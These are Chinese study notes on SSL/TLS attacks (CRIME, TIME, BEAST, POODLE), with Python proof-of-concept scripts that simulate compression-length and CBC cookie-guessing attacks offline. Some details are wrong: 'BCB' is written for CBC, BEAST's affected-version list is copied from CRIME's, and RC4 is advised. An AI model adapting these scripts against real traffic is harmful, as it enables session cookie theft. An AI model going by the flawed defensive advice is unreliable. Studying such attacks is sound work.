+ ## CRIME
    Compression Ratio Info-leak Made Easy

    + #### 攻击原理

      攻击者控制受害者发送大量请求，利用压缩算法的机制猜测请求中的关键信息，根据response长度判断请求是否成功。

      当Response被SSL加密之后，如果使用RC4加密模式，长度并不会发生随机改变。使用BCB加密模式时，因为padding的原因，长度会有略微的改变。

    + #### 受影响的加密算法

      ```
      Deflate = LZ77 + HuffMan
      GZip = Headers + Data Compressed using Deflate
      ```

    + #### 攻击前提

      1. 攻击者可以获取受害者的网络通信包。(中间人攻击，ISP供应商)
      2. 浏览器和服务器支持均支持并使用压缩算法。
      3. 攻击这可以控制受害者发送大量请求并可以控制请求内容。

    + #### 防御方法

      1. 客户端可以升级浏览器

         ```
         • Chrome: 21.0.1180.89 and above
         • Firefox: 15.0.1 and above
         • Opera: 12.01 and above
         • Safari: 5.1.7 and above
         ```

      2. 服务器端

         ```
         • 禁用一些加密算法
         • 禁止过于频繁的请求
         • 修改压缩算法流程，用户输入的数据不进行压缩
         • 随机添加长度不定的垃圾数据
         ```

    + #### 影响范围

      ```
      TLS 1.0.
      SPDY protocol (Google).
      Applications that uses TLS compression.
      Mozilla Firefox (older versions) that support SPDY.
      Google Chrome (older versions) that supported both TLS and SPDY.
      ```

    + #### poc

      ```python
      import string
      import zlib
      import sys
      import random
       
      charset = string.letters + string.digits
       
      COOKIE = ''.join(random.choice(charset) for x in range(30))
       
      HEADERS = ("POST / HTTP/1.1\r\n"
                 "Host: thebankserver.com\r\n"
                 "Connection: keep-alive\r\n"
                 "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
                 "Accept: */*\r\n"
                 "Referer: https://thebankserver.com/\r\n"
                 "Cookie: secret="+COOKIE+"\r\n"
                 "Accept-Encoding: gzip,deflate,sdch\r\n"
                 "Accept-Language: en-US,en;q=0.8\r\n"
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
                 "\r\n")
      BODY =    ("POST / HTTP/1.1\r\n"
                 "Host: thebankserver.com\r\n"
                 "Connection: keep-alive\r\n"
                 "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
                 "Accept: */*\r\n"
                 "Referer: https://thebankserver.com/\r\n"
                 "Cookie: secret=")
      cookie = ""
       
      def compress(data):
       
          c = zlib.compressobj()
          return c.compress(data) + c.flush(zlib.Z_SYNC_FLUSH)
      def getposset(perchar,chars):
          posset = []
          baselen = len(compress(HEADERS+perchar))
          for i in chars:
              t = len(compress(HEADERS+ perchar+i))
              if (t<=baselen):
                  posset += i
          return posset
      def doguess():
          global cookie
          while len(cookie)<30:
              posset = getposset(BODY+cookie,charset)
              trun = 1
              tem_posset = posset
              while 1<len(posset):
                  tem_body = BODY[trun:]
                  posset = getposset(tem_body+cookie,tem_posset)
                  trun = trun +1
              if len(posset)==0:
                  return False
              cookie += posset[0]
              print posset[0]
              return True
       
      while BODY.find("\r\n")>=0:
          if not doguess():
              print "(-)Changebody"
              BODY = BODY[BODY.find("\r\n") + 2:]
      print "(+)orign  cookie"+COOKIE
      print "(+)Gotten cookie"+cookie
      ```

+ ## TIME

    Timing Info-leak Made Easy

    + #### 攻击原理

      攻击者控制受害者发送大量请求，利用压缩算法的机制猜测请求中的关键信息，根据response响应时间判断请求是否成功。

    + #### 攻击前提

      1. 攻击这可以控制受害者发送大量请求并可以控制请求内容。

      2. 稳定的网络环境。

    + #### 防御方法

      1. 在解密Response过程中加入随机的短时间延迟。

      2. 阻止短时间内的频繁请求。

+ ## BEAST

    Browser Exploit Against SSL/TLS

    + #### 攻击原理

      攻击者控制受害者发送大量请求，利用CBC加密模式猜测关键信息。

    + #### 攻击前提

      1. 攻击者可以获取受害者的网络通信包。(中间人攻击，ISP供应商)

      2. 攻击者需要能得到发送敏感数据端的一部分权限。以便将自己的信息插入SSL/TLS会话中。

      3. 攻击者需要准确的找出敏感数据的密文段。

      4. 攻击这可以控制受害者发送大量请求并可以控制请求内容

    + #### 防御方法

      1. 使用RC4加密模式代替BCB加密模式。

      2. 部署TLS 1.1或者更高级的版本，来避免SSL 3.0/TLS 1.0带来的安全问题。

      3. 在服务端设置每传输固定字节，就改变一次加密秘钥。

    + #### 影响范围

      ```
      TLS 1.0.
      SPDY protocol (Google).
      Applications that uses TLS compression.
      Mozilla Firefox (older versions) that support SPDY.
      Google Chrome (older versions) that supported both TLS and SPDY.
      ```

    + #### POC

      攻击者首先使用降级攻击，来让浏览器使用ssl v3.0，再通过ssl v3.0 CBC-mode 存在的缺陷，窃取到用户传输的明文。

      ```python
      import sys
      import string
      import random
      from Crypto.Cipher import AES
       
      key = 'lyp62/22Sh2RlXJF'
      mode = AES.MODE_CBC
      vi = '1234567812345678'
      charset = string.letters + string.digits
      cookie = ''.join(random.choice(charset) for x in range(30))
      HEADERS = ("POST / HTTP/1.1\r\n"
                 "Host: thebankserver.com\r\n"
                 "Connection: keep-alive\r\n"
                 "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\r\n"
                 "Accept: */*\r\n"
                 "Referer: https://thebankserver.com/\r\n"
                 "Cookie: secret="+cookie+"\r\n"
                 "Accept-Encoding: gzip,deflate,sdch\r\n"
                 "Accept-Language: en-US,en;q=0.8\r\n"
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n"
                 "\r\n")
      global pad_num
      def add_padding(plaintext):
          global pad_num
          pad_num = 16 - len(plaintext) % 16
          for i in range(0,pad_num):
              plaintext += chr(pad_num)
          return plaintext
      def check_padding(plaintext):
          global pad_num
          for i in range(1,pad_num+1):
              if (plaintext[-i]!=chr(pad_num)):
                  return False
          return True
       
      def encrypto(plaintext):
          global pad_num
          obj = AES.new(key,mode,vi)
          if (len(plaintext) % 16):
              plaintext = add_padding(plaintext)
          else:
              pad_num=0
          ciphertext = obj.encrypt(plaintext)
          if (check_padding(ciphertext)):
              return ciphertext
          else:
              return 0
       
      def decrypto(ciphertext):
          obj = AES.new(key,mode,vi)
          plaintext = obj.decrypt(ciphertext)
          return plaintext
       
      def findcookie():
          global HEADERS
          return HEADERS.find('secret=')+7
       
      guess_cookie=''
      pos_cookie=findcookie()
      pos_block_s = pos_cookie + 16 - pos_cookie%16
      HEADERS = HEADERS[:pos_cookie] + (16 - pos_cookie % 16 + 15)*'a' +HEADERS[pos_cookie:]
      encry_head = encrypto(add_padding(HEADERS))
      per_per_block = encry_head[pos_block_s - 16:pos_block_s]   #Ci-1
      per_block = encry_head[pos_block_s:pos_block_s+16]         #x
      aft_block = encry_head[pos_block_s+16:pos_block_s+32]      #Ci+1
      for i in charset:
          guess_block = 'a' * 15 + i
          insert_block = ''.join(chr(ord(a) ^ ord(b) ^ ord(c)) for a,b,c in zip(per_block,per_per_block,guess_block))
          temp_header = HEADERS[:pos_block_s+16] + insert_block + HEADERS[pos_block_s+16:]
          encry_temp_header = encrypto(add_padding(temp_header))
          if (aft_block == encry_temp_header[pos_block_s+32:pos_block_s+48]):
              print "(+)first byte is:"+i
      print "(+)orign cookie:"+cookie
      ```

+ ## POODLE

    降级攻击

    ssl v3.0是一个存在了很久的协议了，现在大多数浏览器为了兼容性都会支持这个协议，但是并不会首先使用这个协议，中间人攻击者可以驳回浏览器协商高版本协议的请求，只放行ssl v3.0协议。

    ![image-20220731134915490](C:\Users\suns2\AppData\Roaming\Typora\typora-user-images\image-20220731134915490.png)

